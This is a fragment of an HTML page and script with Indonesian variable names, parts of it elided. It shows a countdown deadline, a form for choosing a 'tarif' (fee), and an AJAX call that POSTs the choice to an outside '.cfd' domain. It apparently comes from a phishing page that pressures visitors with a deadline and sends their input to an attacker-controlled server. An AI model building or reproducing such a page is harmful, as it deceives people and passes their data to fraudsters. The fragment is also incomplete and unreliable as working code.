...
<script>
let tglNow = new Date();
let waktuBatas = new Date("2025-04-06T23:59:59");
...
<form id="patok" style="margin-top: -90px; border-top: 1px solid #ccc; height: 90px; text-align: center; background: url(https://hosting.tigerengine.id/urtrn0.png);
    background-position: 100% 100%;
...
var tarif = $('input[name="tarif"]:checked').val();
 ...
 event.preventDefault();
      $("#process1").fadeIn(); 
        $.ajax({
            type: 'POST',
            url: 'https://ww-zbi.cfd/fd0d/ss/tarif.php',
